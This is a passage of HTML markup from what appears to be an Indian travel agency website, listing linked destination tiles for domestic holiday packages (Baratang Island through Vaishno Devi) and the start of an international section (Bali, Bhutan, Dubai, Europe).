                          <a href="https://travelsetu.com/holiday-tour-packages/baratang-island" class="hover-effect"><img src="https://travelsetu.com/crm/images/destination_image/Baratang Island.jpg" style="height:150px !important;" alt="" /></a>
                        </figure>
                        <div class="details">
                          <a title="View Package List" href="https://travelsetu.com/holiday-tour-packages/baratang-island"><h4 class="box-title">Baratang Island</h4></a>
                        </div>
                      </article>
                    </li>
                        <li>
                      <article class="box">
                        <figure class="animated" data-animation-type="fadeInDown" data-animation-duration="1" data-animation-delay="0.3">
                          <a href="https://travelsetu.com/holiday-tour-packages/bikaner" class="hover-effect"><img src="https://travelsetu.com/crm/images/destination_image/Bikaner.jpg" style="height:150px !important;" alt="" /></a>
                        </figure>
                        <div class="details">
                          <a title="View Package List" href="https://travelsetu.com/holiday-tour-packages/bikaner"><h4 class="box-title">Bikaner</h4></a>
                        </div>
                      </article>
                    </li>
                        <li>
                      <article class="box">
                        <figure class="animated" data-animation-type="fadeInDown" data-animation-duration="1" data-animation-delay="0.3">
                          <a href="https://travelsetu.com/holiday-tour-packages/cochin" class="hover-effect"><img src="https://travelsetu.com/crm/images/destination_image/Cochin.jpg" style="height:150px !important;" alt="" /></a>
                        </figure>
                        <div class="details">
                          <a title="View Package List" href="https://travelsetu.com/holiday-tour-packages/cochin"><h4 class="box-title">Cochin</h4></a>
                        </div>
                      </article>
                    </li>
                        <li>
                      <article class="box">
                        <figure class="animated" data-animation-type="fadeInDown" data-animation-duration="1" data-animation-delay="0.3">
                          <a href="https://travelsetu.com/holiday-tour-packages/coorg" class="hover-effect"><img src="https://travelsetu.com/crm/images/destination_image/Coorg.jpg" style="height:150px !important;" alt="" /></a>
                        </figure>
                        <div class="details">
                          <a title="View Package List" href="https://travelsetu.com/holiday-tour-packages/coorg"><h4 class="box-title">Coorg</h4></a>
                        </div>
                      </article>
                    </li>
                        <li>
                      <article class="box">
                        <figure class="animated" data-animation-type="fadeInDown" data-animation-duration="1" data-animation-delay="0.3">
                          <a href="https://travelsetu.com/holiday-tour-packages/dalhousie" class="hover-effect"><img src="https://travelsetu.com/crm/images/destination_image/Dalhousie.jpg" style="height:150px !important;" alt="" /></a>
                        </figure>
                        <div class="details">
                          <a title="View Package List" href="https://travelsetu.com/holiday-tour-packages/dalhousie"><h4 class="box-title">Dalhousie</h4></a>
                        </div>
                      </article>
                    </li>
                        <li>
                      <article class="box">
                        <figure class="animated" data-animation-type="fadeInDown" data-animation-duration="1" data-animation-delay="0.3">
                          <a href="https://travelsetu.com/holiday-tour-packages/darjelling" class="hover-effect"><img src="https://travelsetu.com/crm/images/destination_image/Darjelling.jpg" style="height:150px !important;" alt="" /></a>
                        </figure>
                        <div class="details">
                          <a title="View Package List" href="https://travelsetu.com/holiday-tour-packages/darjelling"><h4 class="box-title">Darjelling</h4></a>
                        </div>
                      </article>
                    </li>
                        <li>
                      <article class="box">
                        <figure class="animated" data-animation-type="fadeInDown" data-animation-duration="1" data-animation-delay="0.3">
                          <a href="https://travelsetu.com/holiday-tour-packages/dharamshala" class="hover-effect"><img src="https://travelsetu.com/crm/images/destination_image/Dharamshala.jpg" style="height:150px !important;" alt="" /></a>
                        </figure>
                        <div class="details">
                          <a title="View Package List" href="https://travelsetu.com/holiday-tour-packages/dharamshala"><h4 class="box-title">Dharamshala</h4></a>
                        </div>
                      </article>
                    </li>
                        <li>
                      <article class="box">
                        <figure class="animated" data-animation-type="fadeInDown" data-animation-duration="1" data-animation-delay="0.3">
                          <a href="https://travelsetu.com/holiday-tour-packages/gangtok" class="hover-effect"><img src="https://travelsetu.com/crm/images/destination_image/Gangtok.jpg" style="height:150px !important;" alt="" /></a>
                        </figure>
                        <div class="details">
                          <a title="View Package List" href="https://travelsetu.com/holiday-tour-packages/gangtok"><h4 class="box-title">Gangtok</h4></a>
                        </div>
                      </article>
                    </li>
                        <li>
                      <article class="box">
                        <figure class="animated" data-animation-type="fadeInDown" data-animation-duration="1" data-animation-delay="0.3">
                          <a href="https://travelsetu.com/holiday-tour-packages/goa" class="hover-effect"><img src="https://travelsetu.com/crm/images/destination_image/Goa.jpg" style="height:150px !important;" alt="" /></a>
                        </figure>
                        <div class="details">
                          <a title="View Package List" href="https://travelsetu.com/holiday-tour-packages/goa"><h4 class="box-title">Goa</h4></a>
                        </div>
                      </article>
                    </li>
                        <li>
                      <article class="box">
                        <figure class="animated" data-animation-type="fadeInDown" data-animation-duration="1" data-animation-delay="0.3">
                          <a href="https://travelsetu.com/holiday-tour-packages/gulmarg" class="hover-effect"><img src="https://travelsetu.com/crm/images/destination_image/Gulmarg.jpg" style="height:150px !important;" alt="" /></a>
                        </figure>
                        <div class="details">
                          <a title="View Package List" href="https://travelsetu.com/holiday-tour-packages/gulmarg"><h4 class="box-title">Gulmarg</h4></a>
                        </div>
                      </article>
                    </li>
                        <li>
                      <article class="box">
                        <figure class="animated" data-animation-type="fadeInDown" data-animation-duration="1" data-animation-delay="0.3">
                          <a href="https://travelsetu.com/holiday-tour-packages/guwahati" class="hover-effect"><img src="https://travelsetu.com/crm/images/destination_image/Guwahati.jpg" style="height:150px !important;" alt="" /></a>
                        </figure>
                        <div class="details">
                          <a title="View Package List" href="https://travelsetu.com/holiday-tour-packages/guwahati"><h4 class="box-title">Guwahati</h4></a>
                        </div>
                      </article>
                    </li>
                        <li>
                      <article class="box">
                        <figure class="animated" data-animation-type="fadeInDown" data-animation-duration="1" data-animation-delay="0.3">
                          <a href="https://travelsetu.com/holiday-tour-packages/haridwar" class="hover-effect"><img src="https://travelsetu.com/crm/images/destination_image/Haridwar.jpg" style="height:150px !important;" alt="" /></a>
                        </figure>
                        <div class="details">
                          <a title="View Package List" href="https://travelsetu.com/holiday-tour-packages/haridwar"><h4 class="box-title">Haridwar</h4></a>
                        </div>
                      </article>
                    </li>
                        <li>
                      <article class="box">
                        <figure class="animated" data-animation-type="fadeInDown" data-animation-duration="1" data-animation-delay="0.3">
                          <a href="https://travelsetu.com/holiday-tour-packages/havelock" class="hover-effect"><img src="https://travelsetu.com/crm/images/destination_image/Havelock.jpg" style="height:150px !important;" alt="" /></a>
                        </figure>
                        <div class="details">
                          <a title="View Package List" href="https://travelsetu.com/holiday-tour-packages/havelock"><h4 class="box-title">Havelock</h4></a>
                        </div>
                      </article>
                    </li>
                        <li>
                      <article class="box">
                        <figure class="animated" data-animation-type="fadeInDown" data-animation-duration="1" data-animation-delay="0.3">
                          <a href="https://travelsetu.com/holiday-tour-packages/himachal" class="hover-effect"><img src="https://travelsetu.com/crm/images/destination_image/Himachal.jpg" style="height:150px !important;" alt="" /></a>
                        </figure>
                        <div class="details">
                          <a title="View Package List" href="https://travelsetu.com/holiday-tour-packages/himachal"><h4 class="box-title">Himachal</h4></a>
                        </div>
                      </article>
                    </li>
                        <li>
                      <article class="box">
                        <figure class="animated" data-animation-type="fadeInDown" data-animation-duration="1" data-animation-delay="0.3">
                          <a href="https://travelsetu.com/holiday-tour-packages/jaipur" class="hover-effect"><img src="https://travelsetu.com/crm/images/destination_image/Jaipur.jpg" style="height:150px !important;" alt="" /></a>
                        </figure>
                        <div class="details">
                          <a title="View Package List" href="https://travelsetu.com/holiday-tour-packages/jaipur"><h4 class="box-title">Jaipur</h4></a>
                        </div>
                      </article>
                    </li>
                        <li>
                      <article class="box">
                        <figure class="animated" data-animation-type="fadeInDown" data-animation-duration="1" data-animation-delay="0.3">
                          <a href="https://travelsetu.com/holiday-tour-packages/jaisalmer" class="hover-effect"><img src="https://travelsetu.com/crm/images/destination_image/Jaisalmer.jpg" style="height:150px !important;" alt="" /></a>
                        </figure>
                        <div class="details">
                          <a title="View Package List" href="https://travelsetu.com/holiday-tour-packages/jaisalmer"><h4 class="box-title">Jaisalmer</h4></a>
                        </div>
                      </article>
                    </li>
                        <li>
                      <article class="box">
                        <figure class="animated" data-animation-type="fadeInDown" data-animation-duration="1" data-animation-delay="0.3">
                          <a href="https://travelsetu.com/holiday-tour-packages/jim-corbett" class="hover-effect"><img src="https://travelsetu.com/crm/images/destination_image/Jim-Corbett.jpg" style="height:150px !important;" alt="" /></a>
                        </figure>
                        <div class="details">
                          <a title="View Package List" href="https://travelsetu.com/holiday-tour-packages/jim-corbett"><h4 class="box-title">Jim Corbett</h4></a>
                        </div>
                      </article>
                    </li>
                        <li>
                      <article class="box">
                        <figure class="animated" data-animation-type="fadeInDown" data-animation-duration="1" data-animation-delay="0.3">
                          <a href="https://travelsetu.com/holiday-tour-packages/jodhpur" class="hover-effect"><img src="https://travelsetu.com/crm/images/destination_image/Jodhpur.jpg" style="height:150px !important;" alt="" /></a>
                        </figure>
                        <div class="details">
                          <a title="View Package List" href="https://travelsetu.com/holiday-tour-packages/jodhpur"><h4 class="box-title">Jodhpur</h4></a>
                        </div>
                      </article>
                    </li>
                        <li>
                      <article class="box">
                        <figure class="animated" data-animation-type="fadeInDown" data-animation-duration="1" data-animation-delay="0.3">
                          <a href="https://travelsetu.com/holiday-tour-packages/kabini" class="hover-effect"><img src="https://travelsetu.com/crm/images/destination_image/Kabini.jpg" style="height:150px !important;" alt="" /></a>
                        </figure>
                        <div class="details">
                          <a title="View Package List" href="https://travelsetu.com/holiday-tour-packages/kabini"><h4 class="box-title">Kabini</h4></a>
                        </div>
                      </article>
                    </li>
                        <li>
                      <article class="box">
                        <figure class="animated" data-animation-type="fadeInDown" data-animation-duration="1" data-animation-delay="0.3">
                          <a href="https://travelsetu.com/holiday-tour-packages/kargil-" class="hover-effect"><img src="https://travelsetu.com/crm/images/destination_image/Kargil .jpg" style="height:150px !important;" alt="" /></a>
                        </figure>
                        <div class="details">
                          <a title="View Package List" href="https://travelsetu.com/holiday-tour-packages/kargil-"><h4 class="box-title">Kargil </h4></a>
                        </div>
                      </article>
                    </li>
                        <li>
                      <article class="box">
                        <figure class="animated" data-animation-type="fadeInDown" data-animation-duration="1" data-animation-delay="0.3">
                          <a href="https://travelsetu.com/holiday-tour-packages/kashmir" class="hover-effect"><img src="https://travelsetu.com/crm/images/destination_image/Kashmir.jpg" style="height:150px !important;" alt="" /></a>
                        </figure>
                        <div class="details">
                          <a title="View Package List" href="https://travelsetu.com/holiday-tour-packages/kashmir"><h4 class="box-title">Kashmir</h4></a>
                        </div>
                      </article>
                    </li>
                        <li>
                      <article class="box">
                        <figure class="animated" data-animation-type="fadeInDown" data-animation-duration="1" data-animation-delay="0.3">
                          <a href="https://travelsetu.com/holiday-tour-packages/kaziranga" class="hover-effect"><img src="https://travelsetu.com/crm/images/destination_image/Kaziranga.png" style="height:150px !important;" alt="" /></a>
                        </figure>
                        <div class="details">
                          <a title="View Package List" href="https://travelsetu.com/holiday-tour-packages/kaziranga"><h4 class="box-title">Kaziranga</h4></a>
                        </div>
                      </article>
                    </li>
                        <li>
                      <article class="box">
                        <figure class="animated" data-animation-type="fadeInDown" data-animation-duration="1" data-animation-delay="0.3">
                          <a href="https://travelsetu.com/holiday-tour-packages/kerala" class="hover-effect"><img src="https://travelsetu.com/crm/images/destination_image/Kerala.jpg" style="height:150px !important;" alt="" /></a>
                        </figure>
                        <div class="details">
                          <a title="View Package List" href="https://travelsetu.com/holiday-tour-packages/kerala"><h4 class="box-title">Kerala</h4></a>
                        </div>
                      </article>
                    </li>
                        <li>
                      <article class="box">
                        <figure class="animated" data-animation-type="fadeInDown" data-animation-duration="1" data-animation-delay="0.3">
                          <a href="https://travelsetu.com/holiday-tour-packages/kodaikanal" class="hover-effect"><img src="https://travelsetu.com/crm/images/destination_image/Kodaikanal.jpg" style="height:150px !important;" alt="" /></a>
                        </figure>
                        <div class="details">
                          <a title="View Package List" href="https://travelsetu.com/holiday-tour-packages/kodaikanal"><h4 class="box-title">Kodaikanal</h4></a>
                        </div>
                      </article>
                    </li>
                        <li>
                      <article class="box">
                        <figure class="animated" data-animation-type="fadeInDown" data-animation-duration="1" data-animation-delay="0.3">
                          <a href="https://travelsetu.com/holiday-tour-packages/kovalam" class="hover-effect"><img src="https://travelsetu.com/crm/images/destination_image/Kovlam.jpg" style="height:150px !important;" alt="" /></a>
                        </figure>
                        <div class="details">
                          <a title="View Package List" href="https://travelsetu.com/holiday-tour-packages/kovalam"><h4 class="box-title">Kovalam</h4></a>
                        </div>
                      </article>
                    </li>
                        <li>
                      <article class="box">
                        <figure class="animated" data-animation-type="fadeInDown" data-animation-duration="1" data-animation-delay="0.3">
                          <a href="https://travelsetu.com/holiday-tour-packages/kumarakom" class="hover-effect"><img src="https://travelsetu.com/crm/images/destination_image/Kumarakom.jpg" style="height:150px !important;" alt="" /></a>
                        </figure>
                        <div class="details">
                          <a title="View Package List" href="https://travelsetu.com/holiday-tour-packages/kumarakom"><h4 class="box-title">Kumarakom</h4></a>
                        </div>
                      </article>
                    </li>
                        <li>
                      <article class="box">
                        <figure class="animated" data-animation-type="fadeInDown" data-animation-duration="1" data-animation-delay="0.3">
                          <a href="https://travelsetu.com/holiday-tour-packages/leh" class="hover-effect"><img src="https://travelsetu.com/crm/images/destination_image/Leh.jpg" style="height:150px !important;" alt="" /></a>
                        </figure>
                        <div class="details">
                          <a title="View Package List" href="https://travelsetu.com/holiday-tour-packages/leh"><h4 class="box-title">Leh</h4></a>
                        </div>
                      </article>
                    </li>
                        <li>
                      <article class="box">
                        <figure class="animated" data-animation-type="fadeInDown" data-animation-duration="1" data-animation-delay="0.3">
                          <a href="https://travelsetu.com/holiday-tour-packages/leh-ladakh" class="hover-effect"><img src="https://travelsetu.com/crm/images/destination_image/Leh-Ladakh.jpg" style="height:150px !important;" alt="" /></a>
                        </figure>
                        <div class="details">
                          <a title="View Package List" href="https://travelsetu.com/holiday-tour-packages/leh-ladakh"><h4 class="box-title">Leh-Ladakh</h4></a>
                        </div>
                      </article>
                    </li>
                        <li>
                      <article class="box">
                        <figure class="animated" data-animation-type="fadeInDown" data-animation-duration="1" data-animation-delay="0.3">
                          <a href="https://travelsetu.com/holiday-tour-packages/manali" class="hover-effect"><img src="https://travelsetu.com/crm/images/destination_image/Manali.jpg" style="height:150px !important;" alt="" /></a>
                        </figure>
                        <div class="details">
                          <a title="View Package List" href="https://travelsetu.com/holiday-tour-packages/manali"><h4 class="box-title">Manali</h4></a>
                        </div>
                      </article>
                    </li>
                        <li>
                      <article class="box">
                        <figure class="animated" data-animation-type="fadeInDown" data-animation-duration="1" data-animation-delay="0.3">
                          <a href="https://travelsetu.com/holiday-tour-packages/meghalaya" class="hover-effect"><img src="https://travelsetu.com/crm/images/destination_image/Meghalaya.jpg" style="height:150px !important;" alt="" /></a>
                        </figure>
                        <div class="details">
                          <a title="View Package List" href="https://travelsetu.com/holiday-tour-packages/meghalaya"><h4 class="box-title">Meghalaya</h4></a>
                        </div>
                      </article>
                    </li>
                        <li>
                      <article class="box">
                        <figure class="animated" data-animation-type="fadeInDown" data-animation-duration="1" data-animation-delay="0.3">
                          <a href="https://travelsetu.com/holiday-tour-packages/munnar" class="hover-effect"><img src="https://travelsetu.com/crm/images/destination_image/Munnar.jpg" style="height:150px !important;" alt="" /></a>
                        </figure>
                        <div class="details">
                          <a title="View Package List" href="https://travelsetu.com/holiday-tour-packages/munnar"><h4 class="box-title">Munnar</h4></a>
                        </div>
                      </article>
                    </li>
                        <li>
                      <article class="box">
                        <figure class="animated" data-animation-type="fadeInDown" data-animation-duration="1" data-animation-delay="0.3">
                          <a href="https://travelsetu.com/holiday-tour-packages/mussoorie" class="hover-effect"><img src="https://travelsetu.com/crm/images/destination_image/Mussoorie.jpg" style="height:150px !important;" alt="" /></a>
                        </figure>
                        <div class="details">
                          <a title="View Package List" href="https://travelsetu.com/holiday-tour-packages/mussoorie"><h4 class="box-title">Mussoorie</h4></a>
                        </div>
                      </article>
                    </li>
                        <li>
                      <article class="box">
                        <figure class="animated" data-animation-type="fadeInDown" data-animation-duration="1" data-animation-delay="0.3">
                          <a href="https://travelsetu.com/holiday-tour-packages/mysore" class="hover-effect"><img src="https://travelsetu.com/crm/images/destination_image/Mysore.jpg" style="height:150px !important;" alt="" /></a>
                        </figure>
                        <div class="details">
                          <a title="View Package List" href="https://travelsetu.com/holiday-tour-packages/mysore"><h4 class="box-title">Mysore</h4></a>
                        </div>
                      </article>
                    </li>
                        <li>
                      <article class="box">
                        <figure class="animated" data-animation-type="fadeInDown" data-animation-duration="1" data-animation-delay="0.3">
                          <a href="https://travelsetu.com/holiday-tour-packages/nainital" class="hover-effect"><img src="https://travelsetu.com/crm/images/destination_image/Nainital.jpg" style="height:150px !important;" alt="" /></a>
                        </figure>
                        <div class="details">
                          <a title="View Package List" href="https://travelsetu.com/holiday-tour-packages/nainital"><h4 class="box-title">Nainital</h4></a>
                        </div>
                      </article>
                    </li>
                        <li>
                      <article class="box">
                        <figure class="animated" data-animation-type="fadeInDown" data-animation-duration="1" data-animation-delay="0.3">
                          <a href="https://travelsetu.com/holiday-tour-packages/neil-island" class="hover-effect"><img src="https://travelsetu.com/crm/images/destination_image/Neil-Island.jpg" style="height:150px !important;" alt="" /></a>
                        </figure>
                        <div class="details">
                          <a title="View Package List" href="https://travelsetu.com/holiday-tour-packages/neil-island"><h4 class="box-title">Neil Island</h4></a>
                        </div>
                      </article>
                    </li>
                        <li>
                      <article class="box">
                        <figure class="animated" data-animation-type="fadeInDown" data-animation-duration="1" data-animation-delay="0.3">
                          <a href="https://travelsetu.com/holiday-tour-packages/north-east" class="hover-effect"><img src="https://travelsetu.com/crm/images/destination_image/North-East.jpg" style="height:150px !important;" alt="" /></a>
                        </figure>
                        <div class="details">
                          <a title="View Package List" href="https://travelsetu.com/holiday-tour-packages/north-east"><h4 class="box-title">North-East</h4></a>
                        </div>
                      </article>
                    </li>
                        <li>
                      <article class="box">
                        <figure class="animated" data-animation-type="fadeInDown" data-animation-duration="1" data-animation-delay="0.3">
                          <a href="https://travelsetu.com/holiday-tour-packages/nubra-valley" class="hover-effect"><img src="https://travelsetu.com/crm/images/destination_image/Nubra Valley.jpg" style="height:150px !important;" alt="" /></a>
                        </figure>
                        <div class="details">
                          <a title="View Package List" href="https://travelsetu.com/holiday-tour-packages/nubra-valley"><h4 class="box-title">Nubra Valley</h4></a>
                        </div>
                      </article>
                    </li>
                        <li>
                      <article class="box">
                        <figure class="animated" data-animation-type="fadeInDown" data-animation-duration="1" data-animation-delay="0.3">
                          <a href="https://travelsetu.com/holiday-tour-packages/ooty" class="hover-effect"><img src="https://travelsetu.com/crm/images/destination_image/Ooty.jpg" style="height:150px !important;" alt="" /></a>
                        </figure>
                        <div class="details">
                          <a title="View Package List" href="https://travelsetu.com/holiday-tour-packages/ooty"><h4 class="box-title">Ooty</h4></a>
                        </div>
                      </article>
                    </li>
                        <li>
                      <article class="box">
                        <figure class="animated" data-animation-type="fadeInDown" data-animation-duration="1" data-animation-delay="0.3">
                          <a href="https://travelsetu.com/holiday-tour-packages/pahalgam" class="hover-effect"><img src="https://travelsetu.com/crm/images/destination_image/Pahalgam.jpg" style="height:150px !important;" alt="" /></a>
                        </figure>
                        <div class="details">
                          <a title="View Package List" href="https://travelsetu.com/holiday-tour-packages/pahalgam"><h4 class="box-title">Pahalgam</h4></a>
                        </div>
                      </article>
                    </li>
                        <li>
                      <article class="box">
                        <figure class="animated" data-animation-type="fadeInDown" data-animation-duration="1" data-animation-delay="0.3">
                          <a href="https://travelsetu.com/holiday-tour-packages/pangong-lake" class="hover-effect"><img src="https://travelsetu.com/crm/images/destination_image/Pangong Lake.jpg" style="height:150px !important;" alt="" /></a>
                        </figure>
                        <div class="details">
                          <a title="View Package List" href="https://travelsetu.com/holiday-tour-packages/pangong-lake"><h4 class="box-title">Pangong Lake</h4></a>
                        </div>
                      </article>
                    </li>
                        <li>
                      <article class="box">
                        <figure class="animated" data-animation-type="fadeInDown" data-animation-duration="1" data-animation-delay="0.3">
                          <a href="https://travelsetu.com/holiday-tour-packages/pelling" class="hover-effect"><img src="https://travelsetu.com/crm/images/destination_image/Pelling.jpg" style="height:150px !important;" alt="" /></a>
                        </figure>
                        <div class="details">
                          <a title="View Package List" href="https://travelsetu.com/holiday-tour-packages/pelling"><h4 class="box-title">Pelling</h4></a>
                        </div>
                      </article>
                    </li>
                        <li>
                      <article class="box">
                        <figure class="animated" data-animation-type="fadeInDown" data-animation-duration="1" data-animation-delay="0.3">
                          <a href="https://travelsetu.com/holiday-tour-packages/portblair" class="hover-effect"><img src="https://travelsetu.com/crm/images/destination_image/Portblair.jpg" style="height:150px !important;" alt="" /></a>
                        </figure>
                        <div class="details">
                          <a title="View Package List" href="https://travelsetu.com/holiday-tour-packages/portblair"><h4 class="box-title">Portblair</h4></a>
                        </div>
                      </article>
                    </li>
                        <li>
                      <article class="box">
                        <figure class="animated" data-animation-type="fadeInDown" data-animation-duration="1" data-animation-delay="0.3">
                          <a href="https://travelsetu.com/holiday-tour-packages/pushkar" class="hover-effect"><img src="https://travelsetu.com/crm/images/destination_image/Pushkar.jpg" style="height:150px !important;" alt="" /></a>
                        </figure>
                        <div class="details">
                          <a title="View Package List" href="https://travelsetu.com/holiday-tour-packages/pushkar"><h4 class="box-title">Pushkar</h4></a>
                        </div>
                      </article>
                    </li>
                        <li>
                      <article class="box">
                        <figure class="animated" data-animation-type="fadeInDown" data-animation-duration="1" data-animation-delay="0.3">
                          <a href="https://travelsetu.com/holiday-tour-packages/rajasthan" class="hover-effect"><img src="https://travelsetu.com/crm/images/destination_image/Rajasthan.jpg" style="height:150px !important;" alt="" /></a>
                        </figure>
                        <div class="details">
                          <a title="View Package List" href="https://travelsetu.com/holiday-tour-packages/rajasthan"><h4 class="box-title">Rajasthan </h4></a>
                        </div>
                      </article>
                    </li>
                        <li>
                      <article class="box">
                        <figure class="animated" data-animation-type="fadeInDown" data-animation-duration="1" data-animation-delay="0.3">
                          <a href="https://travelsetu.com/holiday-tour-packages/rishikesh" class="hover-effect"><img src="https://travelsetu.com/crm/images/destination_image/Rishikesh.jpg" style="height:150px !important;" alt="" /></a>
                        </figure>
                        <div class="details">
                          <a title="View Package List" href="https://travelsetu.com/holiday-tour-packages/rishikesh"><h4 class="box-title">Rishikesh</h4></a>
                        </div>
                      </article>
                    </li>
                        <li>
                      <article class="box">
                        <figure class="animated" data-animation-type="fadeInDown" data-animation-duration="1" data-animation-delay="0.3">
                          <a href="https://travelsetu.com/holiday-tour-packages/seven-sisters" class="hover-effect"><img src="https://travelsetu.com/crm/images/destination_image/Seven-Sisters.jpg" style="height:150px !important;" alt="" /></a>
                        </figure>
                        <div class="details">
                          <a title="View Package List" href="https://travelsetu.com/holiday-tour-packages/seven-sisters"><h4 class="box-title">Seven Sisters</h4></a>
                        </div>
                      </article>
                    </li>
                        <li>
                      <article class="box">
                        <figure class="animated" data-animation-type="fadeInDown" data-animation-duration="1" data-animation-delay="0.3">
                          <a href="https://travelsetu.com/holiday-tour-packages/shimla" class="hover-effect"><img src="https://travelsetu.com/crm/images/destination_image/Shimla.jpg" style="height:150px !important;" alt="" /></a>
                        </figure>
                        <div class="details">
                          <a title="View Package List" href="https://travelsetu.com/holiday-tour-packages/shimla"><h4 class="box-title">Shimla</h4></a>
                        </div>
                      </article>
                    </li>
                        <li>
                      <article class="box">
                        <figure class="animated" data-animation-type="fadeInDown" data-animation-duration="1" data-animation-delay="0.3">
                          <a href="https://travelsetu.com/holiday-tour-packages/sikkim" class="hover-effect"><img src="https://travelsetu.com/crm/images/destination_image/Sikkim.jpg" style="height:150px !important;" alt="" /></a>
                        </figure>
                        <div class="details">
                          <a title="View Package List" href="https://travelsetu.com/holiday-tour-packages/sikkim"><h4 class="box-title">Sikkim</h4></a>
                        </div>
                      </article>
                    </li>
                        <li>
                      <article class="box">
                        <figure class="animated" data-animation-type="fadeInDown" data-animation-duration="1" data-animation-delay="0.3">
                          <a href="https://travelsetu.com/holiday-tour-packages/sonmarg" class="hover-effect"><img src="https://travelsetu.com/crm/images/destination_image/Sonmarg.jpg" style="height:150px !important;" alt="" /></a>
                        </figure>
                        <div class="details">
                          <a title="View Package List" href="https://travelsetu.com/holiday-tour-packages/sonmarg"><h4 class="box-title">Sonmarg</h4></a>
                        </div>
                      </article>
                    </li>
                        <li>
                      <article class="box">
                        <figure class="animated" data-animation-type="fadeInDown" data-animation-duration="1" data-animation-delay="0.3">
                          <a href="https://travelsetu.com/holiday-tour-packages/south-india" class="hover-effect"><img src="https://travelsetu.com/crm/images/destination_image/South-India.jpg" style="height:150px !important;" alt="" /></a>
                        </figure>
                        <div class="details">
                          <a title="View Package List" href="https://travelsetu.com/holiday-tour-packages/south-india"><h4 class="box-title">South-India</h4></a>
                        </div>
                      </article>
                    </li>
                        <li>
                      <article class="box">
                        <figure class="animated" data-animation-type="fadeInDown" data-animation-duration="1" data-animation-delay="0.3">
                          <a href="https://travelsetu.com/holiday-tour-packages/srinagar" class="hover-effect"><img src="https://travelsetu.com/crm/images/destination_image/Srinagar.jpg" style="height:150px !important;" alt="" /></a>
                        </figure>
                        <div class="details">
                          <a title="View Package List" href="https://travelsetu.com/holiday-tour-packages/srinagar"><h4 class="box-title">Srinagar</h4></a>
                        </div>
                      </article>
                    </li>
                        <li>
                      <article class="box">
                        <figure class="animated" data-animation-type="fadeInDown" data-animation-duration="1" data-animation-delay="0.3">
                          <a href="https://travelsetu.com/holiday-tour-packages/tawang" class="hover-effect"><img src="https://travelsetu.com/crm/images/destination_image/Tawang.jpg" style="height:150px !important;" alt="" /></a>
                        </figure>
                        <div class="details">
                          <a title="View Package List" href="https://travelsetu.com/holiday-tour-packages/tawang"><h4 class="box-title">Tawang</h4></a>
                        </div>
                      </article>
                    </li>
                        <li>
                      <article class="box">
                        <figure class="animated" data-animation-type="fadeInDown" data-animation-duration="1" data-animation-delay="0.3">
                          <a href="https://travelsetu.com/holiday-tour-packages/thekkady" class="hover-effect"><img src="https://travelsetu.com/crm/images/destination_image/Thekkady.jpg" style="height:150px !important;" alt="" /></a>
                        </figure>
                        <div class="details">
                          <a title="View Package List" href="https://travelsetu.com/holiday-tour-packages/thekkady"><h4 class="box-title">Thekkady</h4></a>
                        </div>
                      </article>
                    </li>
                        <li>
                      <article class="box">
                        <figure class="animated" data-animation-type="fadeInDown" data-animation-duration="1" data-animation-delay="0.3">
                          <a href="https://travelsetu.com/holiday-tour-packages/udaipur" class="hover-effect"><img src="https://travelsetu.com/crm/images/destination_image/Udaipur.jpg" style="height:150px !important;" alt="" /></a>
                        </figure>
                        <div class="details">
                          <a title="View Package List" href="https://travelsetu.com/holiday-tour-packages/udaipur"><h4 class="box-title">Udaipur</h4></a>
                        </div>
                      </article>
                    </li>
                        <li>
                      <article class="box">
                        <figure class="animated" data-animation-type="fadeInDown" data-animation-duration="1" data-animation-delay="0.3">
                          <a href="https://travelsetu.com/holiday-tour-packages/uttarakhand" class="hover-effect"><img src="https://travelsetu.com/crm/images/destination_image/Uttarakhand.jpg" style="height:150px !important;" alt="" /></a>
                        </figure>
                        <div class="details">
                          <a title="View Package List" href="https://travelsetu.com/holiday-tour-packages/uttarakhand"><h4 class="box-title">Uttarakhand </h4></a>
                        </div>
                      </article>
                    </li>
                        <li>
                      <article class="box">
                        <figure class="animated" data-animation-type="fadeInDown" data-animation-duration="1" data-animation-delay="0.3">
                          <a href="https://travelsetu.com/holiday-tour-packages/vaishno-devi" class="hover-effect"><img src="https://travelsetu.com/crm/images/destination_image/Vaishno Devi.jpg" style="height:150px !important;" alt="" /></a>
                        </figure>
                        <div class="details">
                          <a title="View Package List" href="https://travelsetu.com/holiday-tour-packages/vaishno-devi"><h4 class="box-title">Vaishno Devi</h4></a>
                        </div>
                      </article>
                    </li>
                      </ul>
                </div>
              </div>
            </div>

            <div class="destinations">
              <div class="container">
                <h2>International</h2>
                <div class="block image-carousel style2 flexslider" data-animation="slide" data-item-width="270" data-item-margin="30">
                  <ul class="slides image-box listing-style2">
                        <li>
                      <article class="box">
                        <figure class="animated" data-animation-type="fadeInDown" data-animation-duration="1" data-animation-delay="0.3">
                          <a href="https://travelsetu.com/holiday-tour-packages/bali" class="hover-effect"><img src="https://travelsetu.com/crm/images/destination_image/Bali.jpg" style="height:150px !important;" alt="" /></a>
                        </figure>
                        <div class="details">
                          <a title="View Package List" href="https://travelsetu.com/holiday-tour-packages/bali"><h4 class="box-title">Bali</h4></a>
                        </div>
                      </article>
                    </li>
                        <li>
                      <article class="box">
                        <figure class="animated" data-animation-type="fadeInDown" data-animation-duration="1" data-animation-delay="0.3">
                          <a href="https://travelsetu.com/holiday-tour-packages/bhutan" class="hover-effect"><img src="https://travelsetu.com/crm/images/destination_image/Bhutan.jpg" style="height:150px !important;" alt="" /></a>
                        </figure>
                        <div class="details">
                          <a title="View Package List" href="https://travelsetu.com/holiday-tour-packages/bhutan"><h4 class="box-title">Bhutan</h4></a>
                        </div>
                      </article>
                    </li>
                        <li>
                      <article class="box">
                        <figure class="animated" data-animation-type="fadeInDown" data-animation-duration="1" data-animation-delay="0.3">
                          <a href="https://travelsetu.com/holiday-tour-packages/dubai" class="hover-effect"><img src="https://travelsetu.com/crm/images/destination_image/Dubai.jpg" style="height:150px !important;" alt="" /></a>
                        </figure>
                        <div class="details">
                          <a title="View Package List" href="https://travelsetu.com/holiday-tour-packages/dubai"><h4 class="box-title">Dubai</h4></a>
                        </div>
                      </article>
                    </li>
                        <li>
                      <article class="box">
                        <figure class="animated" data-animation-type="fadeInDown" data-animation-duration="1" data-animation-delay="0.3">
                          <a href="https://travelsetu.com/holiday-tour-packages/europe" class="hover-effect"><img src="https://travelsetu.com/crm/images/destination_image/Europe.jpg" style="height:150px !important;" alt="" /></a>
                        </figure>
                        <div class="details">
                          <a title="View Package List" href="https://travelsetu.com/holiday-tour-packages/europe"><h4 class="box-title">Europe</h4></a>
                        </div>
                      </article>
                    </li>
                        <li>
                      <article class="box">
